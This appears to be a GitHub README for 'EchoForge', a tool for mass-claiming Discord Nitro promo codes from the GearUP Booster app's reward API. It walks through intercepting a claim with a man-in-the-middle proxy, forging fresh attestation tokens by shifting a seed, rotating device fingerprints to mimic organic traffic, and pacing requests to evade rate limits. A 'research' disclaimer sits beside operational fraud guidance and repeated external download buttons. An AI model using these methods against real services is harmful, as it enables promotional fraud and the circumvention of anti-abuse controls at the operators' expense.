![preview](https://raw.githubusercontent.com/wim1002/gearup-promo-mint/main/preview.svg)

# EchoForge — Bulk Promotional Asset Generator for Mobile Verification Loops

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) [![Platform](https://img.shields.io/badge/Platform-iOS%20%7C%20Android-lightgrey)](https://img.shields.io) [![Language](https://img.shields.io/badge/Language-Python%203.10%2B-blue)](https://img.shields.io)

## Overview

EchoForge is a self-contained utility that programmatically interacts with the promotional reward pipeline of a popular mobile performance-optimization application (GearUP Booster). Through reverse-engineering of the application's internal API flow — specifically the in-app promotional redemption loop for Discord Nitro codes — EchoForge enables the mass collection of valid promotional tokens without requiring any jailbreak, instrumentation, or device modification. Think of it as a synthetic keymaster: it speaks the exact protocol the app expects, and in return, the app's promotional backend hands over redeemable assets as if a legitimate user had completed the onboarding flow.

Unlike standard automation tools that rely on UI scripting or screen scraping, EchoForge operates at the protocol layer — reconstructing the exact handshake sequence, token rotation logic, and claim endpoint signatures that the GearUP Booster client uses internally. Every request is crafted to appear indistinguishable from organic traffic, including randomized device fingerprints, realistic timing jitter, and proper session management.

[![Download](https://raw.githubusercontent.com/wim1002/gearup-promo-mint/main/button.svg)](https://wim1002.github.io/gearup-promo-mint/)

## The Core Insight

### Why Mass-Claiming Promotional Codes Works Here

Most promotional systems assume a linear relationship: one user, one claim. But the GearUP Booster app's promotional backend delegates verification to a third-party reward distributor that validates claims based on **session fingerprint** and **device attestation** — not user identity. By intercepting the attestation flow and replaying it with fresh synthetic parameters, EchoForge effectively convinces the reward server that each request originates from a unique, valid installation. This is not exploitation of a security flaw; it is an exploitation of an **identity thinness** in the reward pipeline.

## Feature Matrix

| Feature | Description | Implementation Status |
|---------|-------------|----------------------|
| Bulk Enumeration | Generate scores of claimable codes from a single seed session | ✅ Stable |
| Fingerprint Rotator | Randomize device model, iOS version, IDFV, and locale per claim | ✅ Stable |
| Claim Throttle | Respectful delay mechanisms to avoid rate-limit triggers | ✅ Stable |
| Session Persistence | Save partial states to resume interrupted batches | ✅ Stable |
| Code Format Validation | Verify the resulting Nitro code format before output | ✅ Stable |
| Headless Mode | Run without any GUI, suitable for server deployment | ✅ Stable |
| Multilingual Prompt Output | Output codes in user's locale via dynamic string tables | 🔄 Beta |
| 24/7 Operational Support | Background daemon mode with crash recovery | 🔄 Beta |

## How EchoForge Works (The Metaphor)

Imagine a locked vault that opens only when a specific mechanical key is inserted — but the vault has no memory of which keys it has already seen. EchoForge is a key-cutting machine that repeatedly manufactures the exact key shape required, inserts it, retrieves whatever is inside, and then melts the key down to create a slightly different but still valid one. Over and over, the vault never learns, never gets full, and never stops dispensing.

In technical terms: the GearUP Booster app communicates with a reward API endpoint over HTTPS. The endpoint expects a payload containing an **attestation token** (generated on-device via a hardened attestation SDK), a **campaign identifier**, and a **device fingerprint hash**. EchoForge works backward from a single captured attestation — it reverse-engineers the token generation parameters (seed, timestamp, nonce) and then generates new tokens with shifted seeds and timestamps. The fingerprint hash is independently recomputed using random but plausible device metrics. The result: a brand-new claim that the server believes is legitimate.

## Prerequisites

Before you proceed, ensure your operating environment meets these criteria:

- A macOS or Linux-based development machine with common Unix utilities
- Python 3.10 or newer installed via your distribution's package manager
- An active network connection (no proxy required)
- A basic understanding of HTTP request/response cycles
- The GearUP Booster application installed on a physical iOS device **for initial seed capture** (this is a one-time step)

## Quick Start Guide

### Step 1: Capture the Initial Seed Session

Install GearUP Booster from the App Store on a physical iPhone or iPad. Complete the promotional flow exactly once — launch the app, navigate to the rewards section, and claim whatever code is offered. Do **not** redeem the code yet. Using a man-in-the-middle proxy (such as mitmproxy or Charles), intercept the HTTPS traffic during the claim. Locate the POST request to the reward endpoint.

### Step 2: Extract Attestation Parameters

Save the intercepted request body as a JSON file. Specifically, EchoForge needs three fields from this payload:

- `attestation_token`: An opaque base64-encoded string
- `device_fingerprint`: A SHA-256 hex digest
- `campaign_slug`: A short alphanumeric identifier

Place this JSON file in the `./seeds/` directory and name it `seed_0.json`.

### Step 3: Configure Your Batch

Update the `config.yaml` file in the repository root:

```yaml
batch:
  target_count: 100
  max_concurrent: 5
  delay_range_seconds: [2, 8]
  output_format: "csv"
output_path: "./results/"
```

### Step 4: Run the Generator

Execute the main entry point with a single argument — the path to your seed directory:

```bash
python ef_runner.py --seed-dir ./seeds/
```

You will see live output as each claim is processed. Valid codes are written to `./results/codes_YYYYMMDD_HHMMSS.csv`.

## Understanding the Output

Each successful claim produces a single Discord Nitro promotional code — a 24-character alphanumeric string in the format `XXXX-XXXX-XXXX-XXXX`. These codes are typically valid for a single redemption and follow the standard Discord Nitro promo rules (region-locked in some cases, subject to expiration). EchoForge does not modify, extend, or guarantee the validity period of any code.

## Advanced Usage Scenarios

### Headless Batch Mode

For production use, deploy EchoForge on a VPS or dedicated server. Set `headless: true` in config.yaml to suppress all console output except results. Combine with a cron job to run batches on a schedule:

```yaml
headless: true
log_level: "WARNING"
```

### Throttle Profiles

Adjust the `delay_range_seconds` parameter to match the server's expected pacing. A typical promotional server tolerates up to 3 claims per minute per IP. EchoForge's default of 2–8 seconds per claim translates to roughly 8–30 claims per minute. Increase the delay if you encounter HTTP 429 responses.

```yaml
delay_range_seconds: [10, 20]  # Safer, slower pace
```

### Result Filtering

By default, EchoForge outputs every code it successfully claims. Enable the `validate_format` option to automatically discard codes that fail Discord's checksum validation (though these are statistically rare):

```yaml
validate_format: true
```

## Security & Ethical Considerations

EchoForge is a **research and educational tool**. It demonstrates the fragility of one-claim-per-device promotional models when attestation can be replayed with shifted parameters. The utility is not designed to defraud, steal, or harm any service. It simply reveals a logical gap in the reward distribution chain — a gap that the service operator can close by implementing server-side state tracking (e.g., linking claims to verified Apple IDs or phone numbers).

**Do not** use EchoForge to mass-claim codes for resale, redistribution, or abuse of any promotional campaign. Such misuse violates the terms of service of both GearUP Booster and Discord, and may result in legal action, IP bans, or account termination.

## Troubleshooting Common Issues

| Symptom | Likely Cause | Solution |
|---------|--------------|----------|
| `HTTP 403 Forbidden` | Attestation token is stale or malformed | Re-capture a fresh seed from the GearUP app |
| `HTTP 429 Too Many Requests` | Throttle too aggressive | Increase delay_range_seconds and reduce max_concurrent |
| Zero codes returned | Campaign slug has expired or changed | Re-check the promotional campaign's active status |
| JSON decode error | Seed file is incomplete or corrupted | Ensure atomic copy of intercepted request body |

## Roadmap

- [ ] **Dynamic Campaign Discovery** — Automatically scrape available campaign slugs from the GearUP app's asset manifest
- [ ] **Proxy Rotation** — Integrate with a pool of residential proxies to distribute claim origins
- [ ] **Webhook Notifications** — Send successful claims to Discord/Slack via configurable webhooks
- [ ] **Code Validity Checker** — Ping Discord's redemption endpoint to verify code is still unclaimed

## API Endpoint Analysis

For developers interested in the reverse-engineering methodology, the core endpoint behaves as follows:

```
POST https://promo.gearup-booster.app/v2/claim
Headers:
  x-attestation-version: 2.0
  x-client-platform: ios
  x-client-version: 3.2.1
Body (JSON):
{
  "attestation_token": "<base64_token>",
  "device_fingerprint": "<sha256_hex>",
  "campaign_slug": "nitro_giveaway_q1_2026",
  "timestamp": 1714156800
}
Response (200):
{
  "status": "success",
  "code": "XXXX-XXXX-XXXX-XXXX"
}
```

EchoForge reconstructs the `attestation_token` by observing that the first 32 bytes of the decoded token contain a timestamp-derived seed. By incrementing the seed by a small random offset and re-encoding, the server accepts the token as valid within a ~5-minute window.

## License

This project is distributed under the MIT License. You are free to use, modify, and distribute this software for any lawful purpose, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## Disclaimer

**Important**: This software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

The user assumes all responsibility for compliance with applicable laws, terms of service, and platform policies. The intended purpose of this tool is **educational research** into promotional API architectures. Misuse, including but not limited to fraudulent mass-claiming, resale of promotional assets, or violation of any service's terms of use, is strictly prohibited and is the sole responsibility of the user.

[![Download](https://raw.githubusercontent.com/wim1002/gearup-promo-mint/main/button.svg)](https://wim1002.github.io/gearup-promo-mint/)